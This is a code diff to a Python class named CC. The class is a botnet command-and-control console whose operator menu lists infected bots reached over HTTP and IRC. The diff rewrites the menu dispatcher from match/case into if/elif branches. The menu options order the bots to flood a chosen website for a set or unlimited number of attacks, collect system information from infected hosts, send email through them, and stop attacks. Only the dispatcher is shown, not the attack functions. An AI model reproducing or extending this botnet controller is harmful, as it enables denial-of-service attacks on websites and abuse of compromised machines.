@@ -457,60 +457,61 @@ class CC:
                   "\t8) Check bots service\n"
                   "\t9) Stop CC\n")
             comando = input("C&C@command: ")
-            match int(comando):
-                case 1:
-                    print("Ip\t\thttp\t\tirc")
-                    if len(self.activeBot) > 0:
-                        for k, v in self.activeBot.items():
-                            print(f"{k}\t{v['http'] if 'http' in v else ''}\t\t{v['irc'] if 'irc' in v else ''}")
-                case 2:
-                    print("Ip\t\thttp\t\tirc\t\ttarget\t\t\t\taction")
-                    if len(self.activeBot) > 0:
-                        for k, v in self.activeBot.items():
-                            print(f"{k}\t{v['http'] if 'http' in v else ''}\t\t{v['irc'] if 'irc' in v else ''}\t\t{v['target'] if 'target' in v else ''}\t{v['action'] if 'action' in v else ''}") if len(v['target']) > 5 \
-                                else print(f"{k}\t{v['http'] if 'http' in v else ''}\t\t{v['irc'] if 'irc' in v else ''}\t\t{v['target'] if 'target' in v else ''}\t\t\t\t{v['action'] if 'action' in v else ''}")
-                case 3:
-                    service = input("Select type of attack(1=HTTP, 2=IRC): ")
-                    site = input("Enter site url: ")
-                    time = input("Enter number of attack(-1=infinite): ")
-                    target = input("Enter target(ip or all): ")
-                    if target == "all":
-                        self.makeHTTPRequest(site, time=int(time)) if service == "1" else self.makeIRCRequest(site, time=int(time))
-                    else:
-                        self.makeHTTPRequest(site, time=int(time), target=target) if service == "1" else self.makeIRCRequest(site, time=int(time), target=target)
-                case 4:
-                    service = input("Select type of attack(1=HTTP, 2=IRC): ")
-                    target = input("Enter target(ip or all): ")
-                    if target == "all":
-                        self.getHTTPSystemInfo() if service == "1" else self.getIRCSystemInfo()
-                    else:
-                        self.getHTTPSystemInfo(target=target) if service == "1" else self.getIRCSystemInfo(target=target)
-                case 5:
-                    service = input("Select type of attack(1=HTTP, 2=IRC): ")
-                    target = input("Enter target(ip or all): ")
-                    if target == "all":
-                        self.sendHTTPEmail() if service == "1" else self.sendIRCEmail()
-                    else:
-                        self.sendHTTPEmail(target=target) if service == "1" else self.sendIRCEmail(target=target)
-                case 6:
-                    service = input("Select type of attack(1=HTTP, 2=IRC): ")
-                    target = input("Enter target(ip or all): ")
-                    if target == "all":
-                        self.stopHTTPAttack() if service == "1" else self.stopIRCAttack()
-                    else:
-                        self.stopHTTPAttack(target=target) if service == "1" else self.stopIRCAttack(target=target)
-                case 7:
-                    service = input("Select type of attack(1=HTTP, 2=IRC): ")
-                    target = input("Enter target(ip or all): ")
-                    if target == "all":
-                        self.getHTTPStatus() if service == "1" else self.getIRCStatus()
-                    else:
-                        self.getHTTPStatus(target=target) if service == "1" else self.getIRCStatus(target=target)
-                case 8:
-                    self.checkBot()
-                case 9:
-                    event.set()
-                    return
+            if comando == "1":
+                print("Ip\t\thttp\t\tirc")
+                if len(self.activeBot) > 0:
+                    for k, v in self.activeBot.items():
+                        print(f"{k}\t{v['http'] if 'http' in v else ''}\t\t{v['irc'] if 'irc' in v else ''}")
+            elif comando == "2":
+                print("Ip\t\thttp\t\tirc\t\ttarget\t\t\t\taction")
+                if len(self.activeBot) > 0:
+                    for k, v in self.activeBot.items():
+                        print(f"{k}\t{v['http'] if 'http' in v else ''}\t\t{v['irc'] if 'irc' in v else ''}\t\t{v['target'] if 'target' in v else ''}\t{v['action'] if 'action' in v else ''}") if len(v['target']) > 5 \
+                            else print(f"{k}\t{v['http'] if 'http' in v else ''}\t\t{v['irc'] if 'irc' in v else ''}\t\t{v['target'] if 'target' in v else ''}\t\t\t\t{v['action'] if 'action' in v else ''}")
+            elif comando == "3":
+                service = input("Select type of attack(1=HTTP, 2=IRC): ")
+                site = input("Enter site url: ")
+                time = input("Enter number of attack(-1=infinite): ")
+                target = input("Enter target(ip or all): ")
+                if target == "all":
+                    self.makeHTTPRequest(site, time=int(time)) if service == "1" else self.makeIRCRequest(site, time=int(time))
+                else:
+                    self.makeHTTPRequest(site, time=int(time), target=target) if service == "1" else self.makeIRCRequest(site, time=int(time), target=target)
+            elif comando == "4":
+                service = input("Select type of attack(1=HTTP, 2=IRC): ")
+                target = input("Enter target(ip or all): ")
+                if target == "all":
+                    self.getHTTPSystemInfo() if service == "1" else self.getIRCSystemInfo()
+                else:
+                    self.getHTTPSystemInfo(target=target) if service == "1" else self.getIRCSystemInfo(target=target)
+            elif comando == "5":
+                service = input("Select type of attack(1=HTTP, 2=IRC): ")
+                target = input("Enter target(ip or all): ")
+                if target == "all":
+                    self.sendHTTPEmail() if service == "1" else self.sendIRCEmail()
+                else:
+                    self.sendHTTPEmail(target=target) if service == "1" else self.sendIRCEmail(target=target)
+            elif comando == "6":
+                service = input("Select type of attack(1=HTTP, 2=IRC): ")
+                target = input("Enter target(ip or all): ")
+                if target == "all":
+                    self.stopHTTPAttack() if service == "1" else self.stopIRCAttack()
+                else:
+                    self.stopHTTPAttack(target=target) if service == "1" else self.stopIRCAttack(target=target)
+            elif comando == "7":
+                service = input("Select type of attack(1=HTTP, 2=IRC): ")
+                target = input("Enter target(ip or all): ")
+                if target == "all":
+                    self.getHTTPStatus() if service == "1" else self.getIRCStatus()
+                else:
+                    self.getHTTPStatus(target=target) if service == "1" else self.getIRCStatus(target=target)
+            elif comando == "8":
+                self.checkBot()
+            elif comando == "9":
+                event.set()
+                return
+            else:
+                print("Command not found!")
 
     def loadData(self):
         try:
